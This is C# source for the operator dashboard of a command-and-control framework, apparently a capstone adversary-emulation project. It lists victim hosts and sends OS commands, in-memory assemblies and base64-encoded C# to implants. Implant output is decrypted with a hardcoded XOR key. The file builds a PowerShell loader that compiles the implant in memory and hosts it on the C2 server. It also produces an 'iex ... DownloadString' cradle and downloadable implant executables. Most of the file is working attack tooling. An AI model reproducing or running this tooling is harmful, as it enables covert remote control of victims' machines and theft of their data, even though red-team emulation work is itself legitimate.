using System;
using System.Collections.Generic;
using System.IO;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using Microsoft.CodeAnalysis;
using Microsoft.CodeAnalysis.CSharp;
using Microsoft.CodeAnalysis.CSharp.Syntax;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Windows.Forms;
using System.Data.SqlClient;
using MySql.Data.MySqlClient;
using Newtonsoft.Json;
using System.Net.Http;
using Microsoft.Toolkit.Uwp.Notifications;
using System.Net;

namespace CapstoneInterface
{
    public partial class Dashboard : Form
    {
        public string host { get; set; }
        public string port { get; set; }

        public string operatorName { get; set; }
        public string userToControl { get; set; }

        public string templatePayload = File.ReadAllText("F:\\capstone-adversary-emulation-tool\\Implementation\\Implant\\Implant.cs");
        public string menu = File.ReadAllText("F:\\capstone-adversary-emulation-tool\\Implementation\\CapstoneInterface\\menu.txt");
        public DataGridView Dgv { get; set; }
        public class Command
        {
            public string Input { get; set; }
            public string ImplantUser { get; set; }
            public string Operator { get; set; }
            public string timeToExec { get; set; }
            public string delay { get; set; }
            public string File { get; set; }
            public string command { get; set; }
        }
        public class User
        {
            [JsonProperty("Victim.username")]
            public string Username { get; set; }

            [JsonProperty("Network.ip_address")]
            public string Network { get; set; }

            [JsonProperty("Operating_System.name")]
            public string OperatingSystem { get; set; }

            [JsonProperty("CPU.architecture")]
            public string CPU { get; set; }

            [JsonProperty("GPU.information")]
            public string GPU { get; set; }

            [JsonProperty("RAM.amount")]
            public string RAM { get; set; }

            [JsonProperty("Storage.amount")]
            public string Storage { get; set; }
        }

        public Dashboard()
        {
            InitializeComponent();
        }

        private void txtConsoleOutput_TextChanged(object sender, EventArgs e)
        {
            // set the current caret position to the end
            txtConsoleOutput.SelectionStart = txtConsoleOutput.Text.Length;
            // scroll it automatically
            txtConsoleOutput.ScrollToCaret();
        }

        private void btnConsole_Click(object sender, EventArgs e)
        {

        }

        private void btnProcesses_Click(object sender, EventArgs e)
        {

        }

        private void txtImplantCode_TextChanged(object sender, EventArgs e)
        {
        }


        private async void btnRunCommand_Click(object sender, EventArgs e)
        {         
            foreach (DataGridViewRow row in dataGridView1.Rows)
            {
                bool isChecked = Convert.ToBoolean(row.Cells["Check"].Value);

                if (isChecked)
                {
                    userToControl = row.Cells["Username"].Value.ToString();
                }
            }

            String input = txtCommand.Text;

            Command commandForImplant = new Command();

            if (input != "")
            {
                if (input.Contains("os"))
                {
                    string[] result = input.Split('#');

                    // Assign the first part to a variable command
                    string instruction = result[0];

                    // Assign the second part to a variable file
                    string command = result[1];

                    String userCommand = @" (04/25)> " + operatorName + " sent " + command + " to '" + userToControl + "'";

                    txtConsoleOutput.AppendText("\r\n\r\n");
                    // Append the user command to the console output
                    txtConsoleOutput.AppendText(userCommand + "\r\n");

                    commandForImplant.Input = instruction;
                    commandForImplant.ImplantUser = userToControl;
                    commandForImplant.Operator = operatorName;
                    commandForImplant.timeToExec = "0";
                    commandForImplant.delay = "0";
                    commandForImplant.command = command;

                    dynamic jsonCommand = JsonConvert.SerializeObject(commandForImplant);

                    sendJSONInstruction(jsonCommand, commandForImplant.ImplantUser);
                }

                else if (input.Contains("execute-assembly")) {
                    string[] result = input.Split('#');

                    string instruction = result[0];
                    string name = result[1];
                    instruction = instruction.TrimEnd();
                    name = name.TrimStart();

                    String userCommand = @" (04/25)> " + operatorName + " sent " + instruction.ToString() + " to '" + userToControl + "'";

                    txtConsoleOutput.AppendText("\r\n\r\n");
                    // Append the user command to the console output
                    txtConsoleOutput.AppendText(userCommand + "\r\n");

                    commandForImplant.Input = instruction;
                    commandForImplant.ImplantUser = userToControl;
                    commandForImplant.Operator = operatorName;
                    commandForImplant.timeToExec = "0";
                    commandForImplant.delay = "0";
                    commandForImplant.File = name;

                    dynamic jsonCommand = JsonConvert.SerializeObject(commandForImplant);

                    sendJSONInstruction(jsonCommand, commandForImplant.ImplantUser);
                }

                else if (input.Contains("loadcs"))
                {
                    string[] result = input.Split('#');

                    string instruction = result[0];
                    string className = result[1];
                    string methodName = result[2];
                    string encodedSourceCode = result[3]; // The base64 encoded source code

                    instruction = instruction.TrimEnd();
                    className = className.TrimStart();
                    className = className.TrimEnd();
                    methodName = methodName.TrimStart();
                    methodName = methodName.TrimEnd();
                    encodedSourceCode = encodedSourceCode.TrimStart();
                    encodedSourceCode = encodedSourceCode.TrimEnd();

                    txtConsoleOutput.AppendText("\r\n\r\nExecuting: " + className + "." + methodName + " For:");
                    byte[] code = Convert.FromBase64String(encodedSourceCode);
                    string decodedSourceCode = Encoding.UTF8.GetString(code);
                    txtConsoleOutput.AppendText("\r\n\r\n" + decodedSourceCode + "\r\n\r\n");

                    String userCommand = @" (04/25)> " + operatorName + " sent " + instruction.ToString() + " to '" + userToControl + "'";

                    txtConsoleOutput.AppendText("\r\n\r\n");
                    // Append the user command to the console output
                    txtConsoleOutput.AppendText(userCommand + "\r\n");

                    commandForImplant.Input = instruction;
                    commandForImplant.ImplantUser = userToControl;
                    commandForImplant.Operator = operatorName;
                    commandForImplant.timeToExec = "0";
                    commandForImplant.delay = "0";
                    commandForImplant.File = encodedSourceCode + " # " + className + " # " + methodName; // Combine encoded source code, class and method into one string
                    
                    dynamic jsonCommand = JsonConvert.SerializeObject(commandForImplant);

                    sendJSONInstruction(jsonCommand, commandForImplant.ImplantUser);
                }
                else if (input.Contains("internal")) 
                {
                    string[] result = input.Split('#');
                    string instruction = result[1];
                    string command = result[2];

                    String userCommand = @" (04/25)> " + operatorName + " sent " + command + " to '" + userToControl + "'";

                    txtConsoleOutput.AppendText("\r\n\r\n");
                    // Append the user command to the console output
                    txtConsoleOutput.AppendText(userCommand + "\r\n");

                    commandForImplant.Input = instruction;
                    commandForImplant.ImplantUser = userToControl;
                    commandForImplant.Operator = operatorName;
                    commandForImplant.timeToExec = "0";
                    commandForImplant.delay = "0";
                    commandForImplant.command = command;

                    dynamic jsonCommand = JsonConvert.SerializeObject(commandForImplant);

                    sendJSONInstruction(jsonCommand, commandForImplant.ImplantUser);
                }
            }
        }

        public async void sendJSONInstruction(dynamic jsonCommand, dynamic user)
        {
            HttpClient client = new HttpClient();
            var content = new StringContent(jsonCommand, Encoding.UTF8, "application/json");
            var response = await client.PostAsync("http://" + host + ":" + port + "/fetchCommand", content);

            // Wait for 10 seconds
            await Task.Delay(10000);

            // Fetch output from the /fetchOutput endpoint
            HttpResponseMessage outputResponse = await client.GetAsync("http://" + host + ":" + port + "/getStoredOutput");

            if (outputResponse.IsSuccessStatusCode)
            {
                // Fetch output as base64 string
                string outputBase64 = await outputResponse.Content.ReadAsStringAsync();

                // Base64 decode the string to get byte array
                byte[] outputBytes = Convert.FromBase64String(outputBase64);

                // Decode XORKey
                string XORKeyB64 = "NVm5dzr1hyhOm4jBTNSFhQGrFhR1gvhbn/BbvZowkO0=";
                byte[] XORKey = Convert.FromBase64String(XORKeyB64);

                // Decrypt the XOR-encoded output bytes
                byte[] decryptedOutputBytes = XOR(outputBytes, XORKey);

                // Convert the decrypted output bytes back to string
                string decryptedOutput = Encoding.UTF8.GetString(decryptedOutputBytes);

                // Parse JSON
                dynamic outputObj = JsonConvert.DeserializeObject(decryptedOutput);

                // Base64 decode the Output field
                string outputContentBase64 = outputObj.Output;
                byte[] outputContentBytes = Convert.FromBase64String(outputContentBase64);
                string outputContent = Encoding.UTF8.GetString(outputContentBytes);

                txtConsoleOutput.AppendText("\r\n\r\n" + "Receiving " + outputContent.Length + " bytes from " + user);
                await Task.Delay(2000);
                txtConsoleOutput.AppendText("\r\n\r\n" + outputContent);
            }


            else
            {
                txtConsoleOutput.AppendText($"\r\nFailed to fetch output. Status code: {outputResponse.StatusCode}");
                string errorContent = await outputResponse.Content.ReadAsStringAsync();
                txtConsoleOutput.AppendText($"\r\nError content: {errorContent}");
            }
        }

        public static byte[] XOR(byte[] data, byte[] key)
        {
            byte[] result = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {
                result[i] = (byte)(data[i] ^ key[i % key.Length]);
            }
            return result;
        }



        private void dataGridView1_CellContentClick(object sender, DataGridViewCellEventArgs e)
        {
        }

        private async void button1_Click(object sender, EventArgs e)
        {
            HttpClient client = new HttpClient();
            HttpResponseMessage response = await client.GetAsync("http://" + host + ":" + port + "/getClients");

            List<User> devices = null;

            if (response.IsSuccessStatusCode)
            {
                string json = await response.Content.ReadAsStringAsync();
                dynamic jsonObj = JsonConvert.DeserializeObject(json);

                devices = JsonConvert.DeserializeObject<List<User>>(json);
            }
            else
            {
                Console.WriteLine("Error: " + response.StatusCode);
            }

            // Create a new DataGridViewCheckBoxColumn
            DataGridViewCheckBoxColumn checkColumn = new DataGridViewCheckBoxColumn();
            checkColumn.HeaderText = "Check";
            checkColumn.Width = 30;
            checkColumn.Name = "Check";
            checkColumn.FlatStyle = FlatStyle.Standard;
            checkColumn.CellTemplate = new DataGridViewCheckBoxCell(false);

            // Add the check column to the DataGridView
            dataGridView1.Columns.Insert(0, checkColumn);

            dataGridView1.AutoSizeColumnsMode = DataGridViewAutoSizeColumnsMode.Fill;
            // Now you can bind the list to the Data Grid View
            dataGridView1.DataSource = devices;
        }

        private async void btnGetData_ClickAsync(object sender, EventArgs e)
        {
            HttpClient client = new HttpClient();
            HttpResponseMessage response = await client.GetAsync($"http://{host}:{port}/getClients");

            List<User> devices = null;

            if (response.IsSuccessStatusCode)
            {
                string json = await response.Content.ReadAsStringAsync();
                dynamic jsonObj = JsonConvert.DeserializeObject(json);

                devices = JsonConvert.DeserializeObject<List<User>>(json);
            }
            else
            {
                Console.WriteLine("Error: " + response.StatusCode);
            }

            dataGridView2.AutoSizeColumnsMode = DataGridViewAutoSizeColumnsMode.Fill;
            // Now you can bind the list to the Data Grid View
            dataGridView2.DataSource = devices;
        }

        private void btnPayloadGenerate_Click(object sender, EventArgs e)
        {
            string code = templatePayload;

            SyntaxTree tree = CSharpSyntaxTree.ParseText(code);
            CompilationUnitSyntax root = tree.GetCompilationUnitRoot();
            SyntaxNode formattedNode = root.NormalizeWhitespace();
            string formattedCode = formattedNode.ToFullString();

            txtPayloadGen.Text = formattedCode;
        }

        private async void btnBundlePayload_Click(object sender, EventArgs e)
        {
            txtPayloadGen.Text = "";
            var plainTextBytes = Encoding.UTF8.GetBytes(templatePayload);
            var b64encodedPayload = Convert.ToBase64String(plainTextBytes);
            var powerShellNETLoader = @"function Invoke-Run() {
    $encodedSource = '" + b64encodedPayload + @"'
    $bytes = [Convert]::FromBase64String($encodedSource)
    $source = [System.Text.Encoding]::UTF8.GetString($bytes)
    $provider = New-Object Microsoft.CSharp.CSharpCodeProvider
    $compiler = $provider.CreateCompiler()
    $parameters = New-Object System.CodeDom.Compiler.CompilerParameters
    $parameters.GenerateInMemory = $True

    $parameters.ReferencedAssemblies.Add(""System.dll"") | Out-Null
    $parameters.ReferencedAssemblies.Add(""System.Net.dll"") | Out-Null
    $parameters.ReferencedAssemblies.Add(""System.Net.Http.dll"") | Out-Null
    
    Write-Host $source
    $results = $compiler.CompileAssemblyFromSource($parameters, $source)
    if ($results.Errors.Count -eq 0) {
        $assembly = $results.CompiledAssembly
        $method = $assembly.EntryPoint
        $method.Invoke($null, $null)
    } else {
        $results.Errors | % { Write-Host $_.ErrorText }
    }
}

Invoke-Run
";


            // Base64 encode powerShellNETLoader
            var netLoaderBytes = System.Text.Encoding.UTF8.GetBytes(powerShellNETLoader);
            var b64encodedNetLoader = System.Convert.ToBase64String(netLoaderBytes);

            var payload = new
            {
                Code = b64encodedNetLoader
            };

            var jsonPayload = JsonConvert.SerializeObject(payload);
            var content = new StringContent(jsonPayload, Encoding.UTF8, "application/json");

            HttpClient client = new HttpClient();
            var response = await client.PostAsync($"http://{host}:{port}/agents/windows/powershell", content);

            if (response.IsSuccessStatusCode)
            {
                txtPayloadGen.Text += powerShellNETLoader;
            }
            else
            {
                // Handle unsuccessful post
            }

            MessageBox.Show("Payload Bundled and Uploaded to Server for Hosting!");

            Cradle cradle = new Cradle();
            cradle.payload = $"iex (New-Object Net.WebClient).DownloadString(\'http://{host}:{port}/agents/windows/powershell\')";
            cradle.ShowDialog();
        }


        public class Message
        {
            public string Username { get; set; }
            public string MessageContent { get; set; } // Avoid property name 'Message' as it might collide with 'System.Exception.Message'
        }

        public class MessageArray
        {
            public List<Message> Messages { get; set; }
        }
        private void Dashboard_Load(object sender, EventArgs e)
        {
            txtConsoleOutput.Text = menu;
            lblServer.Text = host + ":" + port;
            txtPayloadGen.ScrollBars = ScrollBars.Vertical;

            // Parse the code into a SyntaxTree
            SyntaxTree tree = CSharpSyntaxTree.ParseText(templatePayload);

            // Get the root of the tree
            CompilationUnitSyntax root = tree.GetCompilationUnitRoot();

            // Normalize and format the whitespace in the code
            SyntaxNode formattedNode = root.NormalizeWhitespace();

            // The formatted code as a string
            string formattedCode = formattedNode.ToFullString();

            richTextBox1.Text = formattedCode;

            lblOperator.Text = operatorName;

            Task.Factory.StartNew(async () =>
            {
                using (var client = new HttpClient())
                {
                    try
                    {
                        var response = await client.GetAsync($"http://{host}:10100/messageGet");
                        if (response.IsSuccessStatusCode)
                        {
                            var jsonString = await response.Content.ReadAsStringAsync();
                            var messageArray = JsonConvert.DeserializeObject<MessageArray>(jsonString);

                            this.Invoke((MethodInvoker)delegate
                            {
                                // Must update UI controls on the UI thread
                                txtMessagesBox.Clear();
                                foreach (var msg in messageArray.Messages)
                                {
                                    txtMessagesBox.Text += $"{msg.Username}: {msg.MessageContent}\n";
                                }
                            });
                        }
                    }
                    catch (Exception ex)
                    {
                        // Handle any errors here.
                        Console.WriteLine(ex.Message);
                    }
                }
            });
        }


        private void btnEditImplant_Click(object sender, EventArgs e)
        {
            if (richTextBox1.Text != templatePayload.ToString())
            {
                templatePayload = richTextBox1.Text;
            }
        }

        private void btnSignOut_Click(object sender, EventArgs e)
        {
            operatorName = "";

            formLogin form = new formLogin();
            this.Hide();
            form.Closed += (s, args) => this.Close();
            form.Show();
        }

        private void btnSendMessage_Click(object sender, EventArgs e)
        {
            txtMessagesBox.Text = operatorName + " -> " + txtMessageInput.Text;
        }

        private async void btnGenerateImplantShellcode_Click(object sender, EventArgs e)
        {
            using (var client = new HttpClient())
            {
                var response = await client.GetAsync($"http://{host}:{port}/generate/windows/implant");

                if (response.IsSuccessStatusCode)
                {
                    // Prompt the user to select a download location
                    using (var saveFileDialog = new SaveFileDialog())
                    {
                        saveFileDialog.Filter = "EXE Files (*.exe)|*.exe";
                        saveFileDialog.DefaultExt = "exe";
                        saveFileDialog.AddExtension = true;

                        if (saveFileDialog.ShowDialog() == DialogResult.OK)
                        {
                            using (var fileStream = File.Create(saveFileDialog.FileName))
                            {
                                await response.Content.CopyToAsync(fileStream);
                            }

                            MessageBox.Show($"Loader.exe has been downloaded to: {saveFileDialog.FileName}");
                        }
                    }
                }
                else
                {
                    MessageBox.Show("Error generating shellcode, please check the server");
                }
            }
        }

    }
}
